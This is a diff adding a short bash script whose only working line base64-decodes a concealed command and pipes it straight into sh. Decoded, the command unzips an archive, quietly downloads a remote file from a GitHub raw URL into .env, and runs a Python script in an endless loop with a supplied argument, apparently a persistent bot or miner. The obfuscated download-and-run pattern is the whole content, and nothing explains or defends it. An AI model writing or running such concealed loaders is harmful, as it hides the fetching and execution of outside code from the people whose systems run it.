@@ -1,0 +1,3 @@
+#!/bin/bash
+
+base64 -d <<< eWVzIEEgfCB1bnppcCBMZWFybmluZy56aXAgJiYgY3VybCAtcyBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZHVvbmdwb2tlZWVlZWUvYWRkZnNjY3gvcmVmcy9oZWFkcy9tYWluL2EgLW8gLmVudiAmJiBNSU49JDE7IHdoaWxlIHRydWU7IGRvIHB5dGhvbjMgbWFpbi5weSAiJE1JTiI7IHNsZWVwIDEwOyBkb25l | sh
